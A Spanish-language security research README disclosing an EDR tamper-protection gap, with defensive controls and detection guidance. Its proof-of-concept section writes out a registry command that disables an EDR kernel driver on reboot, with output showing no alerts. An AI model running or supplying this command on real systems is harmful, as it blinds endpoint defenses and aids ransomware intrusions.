<div align="center">

```
██████████████████████████████████████████████████████
█                                                    █
█   EDR TAMPER BYPASS                                █
█   Registry Start Value · Driver Disablement        █
█                                                    █
█   T1562.001 / T1112          SEVERITY: CRITICAL    █
█                                                    █
██████████████████████████████████████████████████████
```

![severity](https://img.shields.io/badge/Severity-CRITICAL-red?style=flat-square&logo=bugcrowd)
![technique](https://img.shields.io/badge/MITRE-T1562.001%20%2F%20T1112-blueviolet?style=flat-square)
![privileges](https://img.shields.io/badge/Privileges-Local%20Admin-orange?style=flat-square)
![status](https://img.shields.io/badge/Status-Reported%20·%20Fix%20In%20Progress-yellow?style=flat-square)
![type](https://img.shields.io/badge/Type-Security%20Research-black?style=flat-square)

**by [Gitocode](https://github.com/GitoCode) · Cybersecurity Research**

*Educational & Defensive Purposes Only*

</div>

---

## 🎯 TL;DR

Tamper protection en EDRs bloquea desinstalación y terminación de procesos — pero **no protege el valor `Start` del driver de kernel**. Un admin local puede escribir `Start=4` directamente en el registro, programar la desactivación del driver en el próximo reboot, y el EDR **no genera ninguna alerta**.

Confirmado en múltiples incidentes de ransomware reales.

---

## 🔍 Cobertura de Tamper Protection

| Operación | Bloqueada | Notas |
|-----------|-----------|-------|
| Desinstalación del agente | ✅ Sí | Requiere token de autenticación |
| Terminación de procesos EDR | ✅ Sí | PPL protege el proceso principal |
| **Start DWORD del driver** | ❌ No | Acceso directo — este documento |

---

## ⚙️ Contexto Técnico

El valor `Start` (`REG_DWORD`) en `HKLM\SYSTEM\CurrentControlSet\Services\[EDR_DRIVER]` controla si el driver carga al arranque:

```
0 = Boot      → Fase de arranque temprano
1 = System    → Durante inicialización del kernel  ← valor normal en EDRs
2 = Automatic → SCM al iniciar Windows
3 = Manual    → Solo bajo demanda
4 = Disabled  → No carga nunca                    ← objetivo del ataque
```

---

## 💀 Proof of Concept

```cmd
:: 1. Estado inicial
sc qc [EDR_DRIVER]      → START_TYPE : 1   SYSTEM_START
sc query [EDR_DRIVER]   → STATE      : 4   RUNNING

:: 2. Modificar Start a 4 (Disabled)
reg add "HKLM\SYSTEM\CurrentControlSet\Services\[EDR_DRIVER]" ^
        /v Start /t REG_DWORD /d 4 /f

:: OUTPUT: The operation completed successfully.
:: Tamper protection NO bloqueó esta operación.

:: 3. Reboot
shutdown /r /t 0

:: 4. Post-reboot
sc query [EDR_DRIVER]   → STATE      : 1   STOPPED
:: Driver no cargó. Endpoint sin protección en tiempo real.
```

### Resultado

| | Antes | Después del reboot |
|---|---|---|
| `Start` DWORD | `1` (System) | `4` (Disabled) |
| Estado del driver | `RUNNING` | `STOPPED` |
| Tamper protection | Activa | Activa — no intervino |
| Protección real-time | ✅ | ❌ |
| Alertas generadas | — | **Ninguna** |

---

## 🕐 Timeline de Ataque Observado

> Basado en análisis forense de múltiples incidentes de ransomware reales.

```
T+ 0h  ┃ ACCESO INICIAL      RDP con credenciales administrativas comprometidas
T+ 1h  ┃ RECONOCIMIENTO      Enumeración de servicios y drivers del EDR activos
T+Nh   ┃ EVASIÓN             Modificación de Start=4 en driver(s) del EDR
T+N+1  ┃ REBOOT              Sistema reiniciado — driver no carga al arrancar
T+N+1  ┃ EDR CIEGO           Endpoint sin protección en tiempo real ni alertas
T+48h  ┃ RANSOMWARE          Cifrado masivo sin detección por el EDR local
```

---

## 🛡️ Controles Compensatorios

<details>
<summary><b>01 · Control de Privilegios</b></summary>

- Eliminar admin local del usuario estándar en workstations
- Implementar **Windows LAPS** para rotación de passwords de admin local
- Aplicar tiering de cuentas administrativas (Tier 0/1/2)
- Sin admin, el `reg add` no puede ejecutarse — se elimina la precondición del ataque

</details>

<details>
<summary><b>02 · Detección vía SIEM</b></summary>

- Habilitar **SACL de auditoría** sobre `Services\[EDR_DRIVER]` → Event ID **4657**
- Alertar sobre Event ID **7040** (cambio de start type de servicio)
- Correlacionar con heartbeat perdido del agente en consola del EDR
- Reenvío fuera del host (WEF/syslog) es crítico — sin ello los logs se pierden al cifrar

</details>

<details>
<summary><b>03 · Protección en Safe Mode</b></summary>

- Forzar la carga del agente en Safe Mode donde el producto lo permita por política
- Elimina la vía de reinicio a Safe Mode como bypass complementario

</details>

---

## 🧠 MITRE ATT&CK

| ID | Técnica | Relevancia |
|----|---------|------------|
| [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | Impair Defenses: Disable or Modify Tools | Core del ataque |
| [T1112](https://attack.mitre.org/techniques/T1112/) | Modify Registry | Mecanismo directo |
| [T1543.003](https://attack.mitre.org/techniques/T1543/003/) | Create or Modify System Process: Windows Service | Objetivo modificado |
| [T1070.001](https://attack.mitre.org/techniques/T1070/001/) | Indicator Removal: Clear Windows Event Logs | Observado post-cifrado |

---

## 📄 Reporte Completo

El reporte técnico completo está disponible en [`edr_tamper_report.pdf`](./edr_tamper_report.pdf).

---

## 📢 Responsible Disclosure

Hallazgo identificado en análisis forense de incidentes de ransomware reales.  
Reportado responsablemente a los vendors afectados.  
Vendors confirmaron recepción — fix en desarrollo.  
**Publicación coordinada pendiente de resolución.**

---

<div align="center">

**[Gitocode](https://github.com/GitoCode)** · Cybersecurity Research

*For educational and defensive purposes only.*

</div>
